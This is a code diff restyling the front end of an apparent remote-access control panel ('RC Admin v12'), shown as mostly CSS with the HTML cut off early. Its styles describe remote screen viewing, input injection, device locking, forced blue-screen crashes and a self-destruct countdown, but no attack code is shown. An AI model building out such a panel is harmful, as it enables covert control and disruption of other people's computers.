@@ -1,837 +1,1221 @@
+
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Remote Control Panel v5</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<title>RC Admin v12</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Space+Grotesk:wght@300;400;500;600&display=swap" rel="stylesheet">
+
 <style>
-:root{
-  --bg:#080c10;--panel:#0d1117;--border:#1a2a1a;
-  --green:#00ff88;--green2:#00cc66;--red:#ff3355;
-  --yellow:#ffcc00;--dim:#2a3a2a;--text:#c8ffd4;--muted:#4a6650;
-  --glow:0 0 14px #00ff8866;
-}
-*{margin:0;padding:0;box-sizing:border-box;}
-body{
-  background:var(--bg);color:var(--text);
-  font-family:'Rajdhani',sans-serif;min-height:100vh;
-}
-body::before{
-  content:'';position:fixed;inset:0;
-  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,100,.01) 2px,rgba(0,255,100,.01) 4px);
-  pointer-events:none;z-index:9999;
+/* ═══════════════════════════════════════════════════════════ */
+/*  CSS VARIABLES                                              */
+/* ═══════════════════════════════════════════════════════════ */
+:root {
+  --bg0:      #07080b;
+  --bg1:      #0c0e14;
+  --bg2:      #111420;
+  --bg3:      #181c2e;
+  --border:   #1e2236;
+  --border2:  #252a40;
+
+  --cyan:     #00e5ff;
+  --cyan2:    #00b8d4;
+  --cyan-dim: #004e5a;
+  --red:      #ff3b5c;
+  --red-dim:  #3d0f18;
+  --amber:    #ffb347;
+  --amber-dim:#3d2800;
+  --blue:     #4d8fff;
+  --blue-win: #0078d7;
+  --green:    #39ff96;
+  --green-dim:#0a2a1a;
+
+  --text:     #c5cee8;
+  --text-dim: #5a6080;
+  --text-mid: #8892b0;
+
+  --glow-c:   0 0 20px #00e5ff40;
+  --glow-r:   0 0 20px #ff3b5c40;
+
+  --radius:   6px;
+  --radius-sm:3px;
+
+  --font-mono: 'IBM Plex Mono', monospace;
+  --font-sans: 'Space Grotesk', sans-serif;
 }
 
-.wrap{max-width:1260px;margin:0 auto;padding:16px;}
+/* ═══════════════════════════════════════════════════════════ */
+/*  RESET + BASE                                               */
+/* ═══════════════════════════════════════════════════════════ */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
 
-/* HEADER */
-header{
-  display:flex;align-items:center;justify-content:space-between;
-  border-bottom:1px solid var(--border);padding-bottom:12px;margin-bottom:16px;
+body {
+  background: var(--bg0);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  min-height: 100vh;
+  line-height: 1.5;
+  overflow-x: hidden;
 }
-.logo{font-family:'Share Tech Mono',monospace;font-size:.95rem;color:var(--green);letter-spacing:3px;}
-.logo em{color:var(--muted);font-style:normal;}
-.badges{display:flex;gap:8px;}
-.badge{
-  display:flex;align-items:center;gap:6px;
-  font-family:'Share Tech Mono',monospace;font-size:.65rem;
-  color:var(--muted);background:#0a160a;
-  border:1px solid var(--dim);padding:4px 11px;border-radius:2px;
+
+/* Scan lines overlay */
+body::before {
+  content:'';
+  position:fixed; inset:0; pointer-events:none; z-index:9998;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 3px,
+    rgba(0,229,255,.012) 3px, rgba(0,229,255,.012) 4px
+  );
 }
-.badge .dot{width:6px;height:6px;border-radius:50%;background:var(--muted);}
-.badge.live .dot{background:var(--green);box-shadow:var(--glow);animation:pulse 1.4s infinite;}
-.badge.live{color:var(--green);}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
 
-/* MAIN LAYOUT */
-.layout{display:grid;grid-template-columns:1fr 290px;gap:14px;align-items:start;}
-
-/* ── VIEWER ── */
-.viewer{background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden;}
-
-.vtop{
-  display:flex;align-items:center;gap:8px;
-  padding:8px 14px;background:#060e08;
-  border-bottom:1px solid var(--border);flex-wrap:wrap;
+/* ═══════════════════════════════════════════════════════════ */
+/*  LAYOUT                                                     */
+/* ═══════════════════════════════════════════════════════════ */
+.shell {
+  display: grid;
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
 }
-.lbl{font-size:.6rem;letter-spacing:3px;text-transform:uppercase;color:var(--muted);}
-.lbl.flex-grow{flex:1;}
+
+.topbar {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 10px 20px;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  position: sticky; top: 0; z-index: 100;
+}
+
+.main {
+  display: grid;
+  grid-template-columns: 1fr 300px;
+  gap: 1px;
+  background: var(--border);
+  height: calc(100vh - 44px);
+  overflow: hidden;
+}
+
+.left-panel, .right-panel {
+  background: var(--bg0);
+  overflow-y: auto;
+}
+
+.left-panel {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+
+.right-panel {
+  background: var(--bg1);
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  TOPBAR                                                     */
+/* ═══════════════════════════════════════════════════════════ */
+.logo {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--cyan);
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  flex-shrink: 0;
+}
+.logo span { color: var(--text-dim); }
+
+.top-badges {
+  display: flex;
+  gap: 8px;
+  margin-left: auto;
+  align-items: center;
+}
+
+.badge {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--text-dim);
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  padding: 3px 10px;
+  border-radius: var(--radius-sm);
+  letter-spacing: 1px;
+}
+
+.badge .pip {
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  background: var(--text-dim);
+  flex-shrink: 0;
+}
+
+.badge.live { color: var(--cyan); border-color: var(--cyan-dim); }
+.badge.live .pip {
+  background: var(--cyan);
+  box-shadow: 0 0 8px var(--cyan);
+  animation: blink 1.4s ease-in-out infinite;
+}
+
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  SECTION HEADERS                                            */
+/* ═══════════════════════════════════════════════════════════ */
+.sec-hd {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 8px 16px;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  position: sticky; top: 0; z-index: 10;
+}
+
+.sec-hd .label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--text-dim);
+}
+
+.sec-hd .label.cyan { color: var(--cyan); }
+.sec-hd .label.red  { color: var(--red); }
+.sec-hd .label.blue { color: var(--blue); }
+.sec-hd .label.amber { color: var(--amber); }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  VIEWER                                                     */
+/* ═══════════════════════════════════════════════════════════ */
+.viewer {
+  background: #000;
+  position: relative;
+  flex: 1;
+  min-height: 320px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  border-bottom: 1px solid var(--border);
+}
+
+#scr {
+  display: none;
+  width: 100%;
+  height: auto;
+  cursor: crosshair;
+  user-select: none;
+  -webkit-user-drag: none;
+  image-rendering: high-quality;
+}
+
+.cursor-ring {
+  position: absolute;
+  width: 14px; height: 14px;
+  border: 1.5px solid var(--cyan);
+  border-radius: 50%;
+  pointer-events: none;
+  transform: translate(-50%, -50%);
+  box-shadow: var(--glow-c);
+  display: none;
+  transition: left .03s linear, top .03s linear;
+}
+
+.no-signal {
+  text-align: center;
+  padding: 60px 24px;
+  font-family: var(--font-mono);
+}
+
+.no-signal .icon {
+  font-size: 32px;
+  opacity: .2;
+  display: block;
+  margin-bottom: 12px;
+}
+
+.no-signal p {
+  font-size: 11px;
+  color: var(--text-dim);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+.no-signal .cursor {
+  display: inline-block;
+  width: 7px; height: 14px;
+  background: var(--cyan);
+  margin-left: 4px;
+  vertical-align: middle;
+  animation: blink .9s step-end infinite;
+}
+
+/* Stream info bar */
+.stream-info {
+  padding: 6px 16px;
+  display: flex;
+  gap: 16px;
+  align-items: center;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--text-dim);
+}
+
+.stream-info span { display: flex; align-items: center; gap: 5px; }
 
 /* FPS bar */
-.fps-rail{height:2px;background:var(--border);}
-.fps-fill{height:100%;background:var(--green);width:0;transition:width .6s;box-shadow:var(--glow);}
-
-/* Screen */
-.vbody{
-  position:relative;background:#000;
-  display:flex;align-items:center;justify-content:center;
-  min-height:380px;overflow:hidden;
+.fps-bar {
+  flex: 1;
+  height: 2px;
+  background: var(--border);
+  border-radius: 1px;
+  overflow: hidden;
 }
-#scr{
-  display:none;width:100%;height:auto;
-  cursor:crosshair;user-select:none;-webkit-user-drag:none;
-  image-rendering:high-quality;
-}
-.cring{
-  position:absolute;width:16px;height:16px;
-  border:2px solid var(--green);border-radius:50%;
-  pointer-events:none;transform:translate(-50%,-50%);
-  box-shadow:var(--glow);display:none;
-  transition:left .03s linear,top .03s linear;
-}
-.no-scr{
-  text-align:center;padding:56px 24px;
-  font-family:'Share Tech Mono',monospace;color:var(--muted);font-size:.8rem;
-}
-.blink{animation:blink 1s step-end infinite;}
-@keyframes blink{50%{opacity:0}}
-
-/* KB bar */
-.kbbar{
-  display:flex;gap:8px;padding:9px 14px;
-  background:#060e08;border-top:1px solid var(--border);
-}
-.kbbar input{
-  flex:1;background:#060e08;border:1px solid var(--dim);
-  color:var(--text);font-family:'Rajdhani',sans-serif;font-size:.95rem;
-  padding:7px 12px;border-radius:2px;outline:none;
-}
-.kbbar input:focus{border-color:var(--green);}
-
-/* ── SIDE ── */
-.side{display:flex;flex-direction:column;gap:12px;}
-.card{background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden;}
-.ch{
-  padding:8px 14px;background:#060e08;
-  border-bottom:1px solid var(--border);
-  font-size:.6rem;letter-spacing:3px;
-  text-transform:uppercase;color:var(--muted);
-}
-.ch.row{display:flex;align-items:center;justify-content:space-between;}
-
-/* Stats */
-.sgrid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);}
-.stat{background:var(--panel);padding:11px 13px;}
-.sl{font-size:.58rem;letter-spacing:1px;text-transform:uppercase;color:var(--muted);}
-.sv{font-family:'Share Tech Mono',monospace;font-size:1.4rem;color:var(--green);text-shadow:var(--glow);}
-
-/* Device list */
-#devlist{max-height:200px;overflow-y:auto;}
-#devlist::-webkit-scrollbar{width:3px;}
-#devlist::-webkit-scrollbar-thumb{background:var(--dim);}
-.di{
-  padding:8px 13px;border-bottom:1px solid #0f1a0f;
-  display:flex;align-items:center;gap:7px;cursor:pointer;transition:.12s;
-}
-.di:hover{background:#0a160a;}
-.di:last-child{border-bottom:none;}
-.di.active{background:#001a0a;border-left:2px solid var(--green);}
-.ddot{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0;}
-.ddot.on{background:var(--green);box-shadow:0 0 6px #00ff8899;}
-.dinfo{flex:1;min-width:0;}
-.dname{font-family:'Share Tech Mono',monospace;font-size:.76rem;color:var(--green);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-.dmeta{font-size:.6rem;color:var(--muted);margin-top:1px;}
-.dlk{font-size:.6rem;padding:2px 6px;border-radius:2px;white-space:nowrap;}
-.dlk.lk{background:#200005;color:var(--red);border:1px solid #440011;}
-.dlk.ok{background:#001a0a;color:var(--green2);border:1px solid var(--dim);}
-
-/* Lock control */
-.qa{padding:10px 12px;display:flex;flex-direction:column;gap:7px;}
-.qa input{
-  background:#060e08;border:1px solid var(--dim);color:var(--text);
-  font-family:'Rajdhani',sans-serif;font-size:.88rem;
-  padding:7px 10px;border-radius:2px;outline:none;width:100%;
-}
-.qa input:focus{border-color:var(--green);}
-.row2{display:flex;gap:7px;}
-.row2 .btn{flex:1;}
-
-/* Shortcuts */
-.skgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;padding:10px;}
-
-/* Buttons */
-.btn{
-  font-family:'Rajdhani',sans-serif;font-weight:700;font-size:.72rem;
-  letter-spacing:1px;text-transform:uppercase;
-  padding:7px 10px;border-radius:2px;border:none;cursor:pointer;transition:all .12s;
-}
-.br{background:transparent;border:1px solid var(--red);color:var(--red);}
-.br:hover{background:var(--red);color:#000;box-shadow:0 0 10px #ff335550;}
-.bg{background:transparent;border:1px solid var(--green);color:var(--green);}
-.bg:hover{background:var(--green);color:#000;box-shadow:var(--glow);}
-.bsr{background:var(--red);color:#fff;border:1px solid var(--red);}
-.bsr:hover{background:#c00;}
-.bsg{background:var(--green2);color:#000;border:1px solid var(--green2);}
-.bsg:hover{background:var(--green);}
-.btn.sm{padding:5px 8px;font-size:.68rem;}
-
-/* mode btn */
-.mb{
-  padding:4px 9px;font-size:.65rem;letter-spacing:1px;border-radius:2px;
-  border:1px solid var(--dim);background:transparent;color:var(--muted);
-  cursor:pointer;font-family:'Rajdhani',sans-serif;text-transform:uppercase;
-}
-.mb.on{border-color:var(--green);color:var(--green);background:#001a0a;}
-
-/* Log */
-#log{height:130px;overflow-y:auto;padding:7px 12px;
-  font-family:'Share Tech Mono',monospace;font-size:.65rem;line-height:1.9;}
-#log::-webkit-scrollbar{width:3px;}
-#log::-webkit-scrollbar-thumb{background:var(--dim);}
-.le{display:flex;gap:8px;}
-.lt{color:var(--muted);min-width:54px;flex-shrink:0;}
-.lm.ok{color:var(--green);}
-.lm.er{color:var(--red);}
-.lm.in{color:var(--yellow);}
-
-/* Toast */
-#toast{
-  position:fixed;bottom:16px;right:16px;
-  background:var(--panel);border:1px solid var(--green);
-  color:var(--green);font-family:'Share Tech Mono',monospace;
-  font-size:.7rem;padding:9px 16px;border-radius:3px;
-  transform:translateY(12px);opacity:0;transition:all .22s;
-  z-index:10000;box-shadow:var(--glow);
-}
-#toast.show{opacity:1;transform:translateY(0);}
-#toast.err{border-color:var(--red);color:var(--red);}
-
-@media(max-width:820px){.layout{grid-template-columns:1fr;}}
-
-/* ── BSOD CARD ── */
-.bsod-card{border-color:#003a6a !important;}
-.bsod-card .ch{color:#4dc3ff !important;border-bottom-color:#003a6a !important;background:#040d17 !important;}
-.btn-bsod{
-  width:100%;padding:9px;font-size:.78rem;letter-spacing:2px;
-  background:transparent;border:1px solid #0078d7;color:#4dc3ff;
-  font-family:'Share Tech Mono',monospace;cursor:pointer;border-radius:2px;
-  transition:all .15s;
-}
-.btn-bsod:hover{background:#0078d7;color:#fff;box-shadow:0 0 18px #0078d780;}
-.bsod-select{
-  width:100%;background:#040d17;border:1px solid #003a6a;
-  color:#4dc3ff;font-family:'Share Tech Mono',monospace;font-size:.65rem;
-  padding:6px 8px;border-radius:2px;outline:none;
-}
-.bsod-select:focus{border-color:#0078d7;}
-.bsod-row{display:flex;gap:6px;align-items:center;}
-.bsod-num{
-  width:64px;background:#040d17;border:1px solid #003a6a;
-  color:#4dc3ff;font-family:'Share Tech Mono',monospace;font-size:.7rem;
-  padding:6px 7px;border-radius:2px;outline:none;text-align:center;
-}
-.bsod-num:focus{border-color:#0078d7;}
-.bsod-lbl{font-size:.58rem;color:var(--muted);letter-spacing:1px;white-space:nowrap;}
-
-/* ── SELF DESTRUCT ── */
-.destruct-card{border-color:#3a0010 !important;}
-.destruct-card .ch{color:#ff3355 !important;border-bottom-color:#3a0010 !important;background:#0d0008 !important;}
-.btn-destruct{
-  width:100%;padding:10px;font-size:.8rem;letter-spacing:2px;
-  background:transparent;border:1px solid #ff3355;color:#ff3355;
-  font-family:'Share Tech Mono',monospace;cursor:pointer;border-radius:2px;
-  transition:all .15s;position:relative;overflow:hidden;
-}
-.btn-destruct:hover{background:#ff3355;color:#000;box-shadow:0 0 18px #ff335580;}
-.btn-destruct::before{
-  content:'';position:absolute;inset:0;
-  background:repeating-linear-gradient(90deg,transparent,transparent 4px,#ff335511 4px,#ff335511 8px);
-  pointer-events:none;
-}
-.btn-destruct-all{
-  width:100%;padding:8px;font-size:.72rem;letter-spacing:1px;
-  background:transparent;border:1px solid #882233;color:#882233;
-  font-family:'Share Tech Mono',monospace;cursor:pointer;border-radius:2px;
-  transition:all .15s;margin-top:6px;
-}
-.btn-destruct-all:hover{background:#882233;color:#fff;box-shadow:0 0 12px #88223360;}
-
-/* ── MODAL ── */
-.modal-bg{
-  display:none;position:fixed;inset:0;background:#000000cc;
-  z-index:99999;align-items:center;justify-content:center;
-  backdrop-filter:blur(3px);
-}
-.modal-bg.show{display:flex;}
-.modal{
-  background:#0d0a0a;border:1px solid #ff3355;border-radius:4px;
-  padding:28px 32px;min-width:320px;max-width:420px;text-align:center;
-  box-shadow:0 0 40px #ff335544;
-}
-.modal-icon{font-size:2.6rem;margin-bottom:10px;}
-.modal-title{
-  font-family:'Share Tech Mono',monospace;font-size:1rem;
-  color:#ff3355;letter-spacing:3px;margin-bottom:6px;
-}
-.modal-sub{font-size:.78rem;color:#885566;margin-bottom:6px;line-height:1.6;}
-.modal-target{
-  font-family:'Share Tech Mono',monospace;font-size:.8rem;
-  color:#ffaa00;background:#1a0800;border:1px solid #3a2200;
-  padding:6px 12px;border-radius:2px;margin:10px 0 18px;
-  word-break:break-all;
-}
-.modal-warn{font-size:.7rem;color:#662233;margin-bottom:18px;line-height:1.5;}
-.modal-btns{display:flex;gap:10px;}
-.modal-btns button{flex:1;padding:10px;font-family:'Share Tech Mono',monospace;
-  font-size:.72rem;letter-spacing:1px;border-radius:2px;cursor:pointer;border:1px solid;}
-.mbtn-cancel{background:transparent;border-color:#334433;color:#446644;}
-.mbtn-cancel:hover{background:#112211;}
-.mbtn-confirm{background:#ff3355;border-color:#ff3355;color:#000;font-weight:700;}
-.mbtn-confirm:hover{background:#cc1133;box-shadow:0 0 14px #ff335560;}
-
-/* countdown ring */
-.cd-wrap{display:flex;align-items:center;justify-content:center;margin-bottom:14px;}
-.cd-ring{
-  width:52px;height:52px;border-radius:50%;
-  border:3px solid #3a0010;border-top-color:#ff3355;
-  display:flex;align-items:center;justify-content:center;
-  font-family:'Share Tech Mono',monospace;font-size:1.1rem;color:#ff3355;
-  transition:border-top-color .3s;
+.fps-fill {
+  height: 100%;
+  background: var(--cyan);
+  width: 0;
+  transition: width .6s;
+  box-shadow: var(--glow-c);
 }
 
+/* Mode toggles */
+.mode-row {
+  display: flex;
+  gap: 6px;
+  padding: 8px 16px;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+}
+
+.mode-btn {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border2);
+  background: transparent;
+  color: var(--text-dim);
+  cursor: pointer;
+  transition: all .15s;
+}
+.mode-btn.on {
+  border-color: var(--cyan);
+  color: var(--cyan);
+  background: rgba(0,229,255,.06);
+}
+
+/* Keyboard bar */
+.kb-bar {
+  display: flex;
+  gap: 8px;
+  padding: 8px 16px;
+  background: var(--bg1);
+  border-top: 1px solid var(--border);
+}
+
+.kb-bar input {
+  flex: 1;
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 13px;
+  padding: 6px 12px;
+  border-radius: var(--radius-sm);
+  outline: none;
+  transition: border-color .15s;
+}
+.kb-bar input:focus { border-color: var(--cyan); }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  SHORTCUT KEYS                                              */
+/* ═══════════════════════════════════════════════════════════ */
+.sk-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 5px;
+  padding: 10px 16px;
+}
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  BUTTONS                                                    */
+/* ═══════════════════════════════════════════════════════════ */
+.btn {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  font-weight: 500;
+  padding: 7px 12px;
+  border-radius: var(--radius-sm);
+  border: 1px solid transparent;
+  cursor: pointer;
+  transition: all .15s;
+  white-space: nowrap;
+}
+
+.btn-c  { border-color: var(--cyan);  color: var(--cyan);  background: transparent; }
+.btn-c:hover  { background: var(--cyan);  color: #000; box-shadow: var(--glow-c); }
+
+.btn-r  { border-color: var(--red);   color: var(--red);   background: transparent; }
+.btn-r:hover  { background: var(--red);   color: #fff; box-shadow: var(--glow-r); }
+
+.btn-rc { background: var(--red);  color: #fff; border-color: var(--red); }
+.btn-rc:hover { background: #c0002a; }
+
+.btn-cc { background: var(--cyan2); color: #000; border-color: var(--cyan2); }
+.btn-cc:hover { background: var(--cyan); }
+
+.btn-b  { border-color: var(--blue-win); color: #7fc7ff; background: transparent; }
+.btn-b:hover  { background: var(--blue-win); color: #fff; box-shadow: 0 0 16px #0078d740; }
+
+.btn-a  { border-color: var(--amber); color: var(--amber); background: transparent; }
+.btn-a:hover  { background: var(--amber); color: #000; }
+
+.btn-sm { padding: 5px 9px; font-size: 9px; }
+.btn-full { width: 100%; }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  RIGHT PANEL — DEVICE LIST                                 */
+/* ═══════════════════════════════════════════════════════════ */
+#devlist { max-height: 220px; overflow-y: auto; }
+
+.dev-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 9px 16px;
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  transition: background .12s;
+}
+.dev-item:hover { background: var(--bg2); }
+.dev-item.active {
+  background: rgba(0,229,255,.05);
+  border-left: 2px solid var(--cyan);
+}
+
+.dev-pip {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--text-dim);
+  flex-shrink: 0;
+}
+.dev-pip.on {
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+  animation: blink 2s ease-in-out infinite;
+}
+
+.dev-info { flex: 1; min-width: 0; }
+.dev-name {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--cyan);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.dev-meta {
+  font-size: 10px;
+  color: var(--text-dim);
+  margin-top: 1px;
+}
+
+.dev-tag {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  padding: 2px 6px;
+  border-radius: 2px;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+.dev-tag.locked  { background: var(--red-dim);  color: var(--red);  border: 1px solid #5a1020; }
+.dev-tag.online  { background: var(--green-dim); color: var(--green); border: 1px solid #1a4a30; }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  STATS GRID                                                 */
+/* ═══════════════════════════════════════════════════════════ */
+.stats-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1px;
+  background: var(--border);
+}
+.stat-cell {
+  background: var(--bg0);
+  padding: 12px 14px;
+}
+.stat-label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--text-dim);
+  margin-bottom: 3px;
+}
+.stat-value {
+  font-family: var(--font-mono);
+  font-size: 22px;
+  font-weight: 500;
+  color: var(--cyan);
+  text-shadow: var(--glow-c);
+  line-height: 1;
+}
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  LOCK CONTROL                                               */
+/* ═══════════════════════════════════════════════════════════ */
+.lock-panel {
+  padding: 12px 16px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.lock-panel input {
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 12px;
+  padding: 7px 10px;
+  border-radius: var(--radius-sm);
+  outline: none;
+  width: 100%;
+  transition: border-color .15s;
+}
+.lock-panel input:focus { border-color: var(--cyan); }
+
+.btn-row { display: flex; gap: 7px; }
+.btn-row .btn { flex: 1; }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  BSOD PANEL                                                 */
+/* ═══════════════════════════════════════════════════════════ */
+.bsod-panel {
+  padding: 12px 16px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  border-color: #003060 !important;
+}
+
+.bsod-select {
+  width: 100%;
+  background: var(--bg2);
+  border: 1px solid #003060;
+  color: #7fc7ff;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  padding: 6px 8px;
+  border-radius: var(--radius-sm);
+  outline: none;
+}
+.bsod-select:focus { border-color: var(--blue-win); }
+
+.bsod-row { display: flex; gap: 6px; align-items: center; }
+
+.bsod-num {
+  width: 65px;
+  background: var(--bg2);
+  border: 1px solid #003060;
+  color: #7fc7ff;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  padding: 5px 8px;
+  border-radius: var(--radius-sm);
+  outline: none;
+  text-align: center;
+}
+.bsod-lbl {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-dim);
+  letter-spacing: 1px;
+  white-space: nowrap;
+}
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  LOG                                                        */
+/* ═══════════════════════════════════════════════════════════ */
+#log {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px 14px;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  line-height: 2;
+  max-height: 160px;
+}
+
+.log-entry { display: flex; gap: 10px; }
+.log-time  { color: var(--text-dim); min-width: 60px; flex-shrink: 0; }
+.log-msg.ok  { color: var(--cyan); }
+.log-msg.er  { color: var(--red); }
+.log-msg.in  { color: var(--amber); }
+.log-msg.dim { color: var(--text-dim); }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  DESTRUCT MODAL                                             */
+/* ═══════════════════════════════════════════════════════════ */
+#destructModal {
+  display: none;
+  position: fixed; inset: 0; z-index: 9999;
+  background: rgba(0,0,0,.85);
+  backdrop-filter: blur(4px);
+  align-items: center;
+  justify-content: center;
+}
+#destructModal.show { display: flex; }
+
+.modal-box {
+  background: #0d0508;
+  border: 1px solid var(--red);
+  border-radius: var(--radius);
+  padding: 32px;
+  max-width: 380px;
+  width: 90%;
+  box-shadow: 0 0 60px #ff3b5c25, 0 0 120px #ff3b5c10;
+  animation: modal-in .2s ease;
+  text-align: center;
+}
+
+@keyframes modal-in {
+  from { opacity:0; transform: scale(.92); }
+  to   { opacity:1; transform: scale(1); }
+}
+
+.modal-icon {
+  font-size: 42px;
+  display: block;
+  margin-bottom: 14px;
+}
+
+.modal-title {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  letter-spacing: 4px;
+  color: var(--red);
+  text-transform: uppercase;
+  margin-bottom: 12px;
+}
+
+.modal-target {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  margin-bottom: 20px;
+  background: var(--bg2);
+  padding: 6px 12px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border2);
+}
+
+.modal-warn {
+  font-size: 12px;
+  color: var(--text-mid);
+  margin-bottom: 24px;
+  line-height: 1.6;
+}
+
+.cd-ring {
+  width: 56px; height: 56px;
+  border-radius: 50%;
+  border: 2px solid var(--red-dim);
+  border-top-color: transparent;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 20px;
+  font-family: var(--font-mono);
+  font-size: 22px;
+  font-weight: 600;
+  color: var(--red);
+  transition: border-top-color .3s;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.modal-btns { display: flex; gap: 10px; }
+.modal-btns .btn { flex: 1; }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  TOAST                                                      */
+/* ═══════════════════════════════════════════════════════════ */
+#toast {
+  position: fixed;
+  bottom: 20px; right: 20px;
+  background: var(--bg1);
+  border: 1px solid var(--cyan);
+  color: var(--cyan);
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 1px;
+  padding: 9px 16px;
+  border-radius: var(--radius);
+  opacity: 0;
+  transform: translateY(8px);
+  transition: all .22s;
+  z-index: 10000;
+  box-shadow: var(--glow-c);
+  max-width: 280px;
+}
+#toast.show { opacity: 1; transform: translateY(0); }
+#toast.err  { border-color: var(--red); color: var(--red); box-shadow: var(--glow-r); }
+
+/* ═══════════════════════════════════════════════════════════ */
+/*  DIVIDERS + UTILS                                           */
+/* ═══════════════════════════════════════════════════════════ */
+.divider { height: 1px; background: var(--border); }
+
+.section-pad { padding: 12px 16px; }
+
+.flex-row {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+}
+
+@media (max-width: 860px) {
+  .main { grid-template-columns: 1fr; grid-template-rows: auto auto; }
+  .right-panel { border-top: 1px solid var(--border); }
+}
 </style>
 </head>
 <body>
-<div class="wrap">
 
-<header>
-  <div class="logo">RCP<em>//</em>Remote Control Panel <em>v5</em></div>
-  <div class="badges">
-    <div class="badge" id="fbb"><div class="dot"></div><span id="fbt">FIREBASE...</span></div>
-    <div class="badge" id="stb"><div class="dot"></div><span id="stt">NO STREAM</span></div>
+<div class="shell">
+
+<!-- ══════════════════════ TOP BAR ══════════════════════ -->
+<header class="topbar">
+  <div class="logo">RC<span>_</span>ADMIN <span>// v12.0</span></div>
+
+  <div class="top-badges">
+    <div class="badge live">
+      <div class="pip"></div>
+      FIREBASE
+    </div>
+    <div class="badge" id="badge-hb">
+      <div class="pip"></div>
+      HB 2s
+    </div>
+    <div class="badge" id="badge-dev">
